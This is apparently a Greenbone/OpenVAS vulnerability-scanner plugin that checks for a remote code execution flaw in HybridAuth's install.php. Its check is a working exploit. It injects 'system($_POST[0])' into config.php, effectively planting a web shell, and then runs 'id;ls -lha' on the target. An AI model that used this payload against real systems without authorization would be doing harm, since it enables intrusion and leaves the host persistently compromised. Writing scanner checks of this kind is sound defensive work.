if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804753" );
	script_version( "2020-10-20T15:03:35+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)" );
	script_tag( name: "creation_date", value: "2014-08-26 10:58:06 +0530 (Tue, 26 Aug 2014)" );
	script_name( "HybridAuth 'install.php' Remote Code Execution Vulnerability" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/34273" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/34390" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127930" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Aug/10" );
	script_tag( name: "summary", value: "This host is installed with HybridAuth and is prone to remote code execution
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is
  able to execute the code remotely." );
	script_tag( name: "insight", value: "Flaw exists because the hybridauth/install.php script does not properly verify
  or sanitize user-uploaded files." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary code in the
  affected system." );
	script_tag( name: "affected", value: "HybridAuth version 2.1.2 and probably prior." );
	script_tag( name: "solution", value: "Upgrade to HybridAuth version 2.2.2 or later." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/", "/auth", "/hybridauth", "/social", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: dir + "/install.php", port: port );
	if(ContainsString( rcvRes, ">HybridAuth Installer<" )){
		url = dir + "/install.php";
		postData = "OPENID_ADAPTER_STATUS=system($_POST[0]))));/*";
		sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
		rcvRes = http_keepalive_send_recv( port: port, data: sndReq, bodyonly: FALSE );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "<title>HybridAuth Installer</title>" )){
			url = dir + "/config.php";
			postData = "0=id;ls -lha";
			sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
			rcvRes = http_keepalive_send_recv( port: port, data: sndReq, bodyonly: FALSE );
			if(IsMatchRegexp( rcvRes, "uid=[0-9]+.*gid=[0-9]+" )){
				report = http_report_vuln_url( url: url, port: port );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

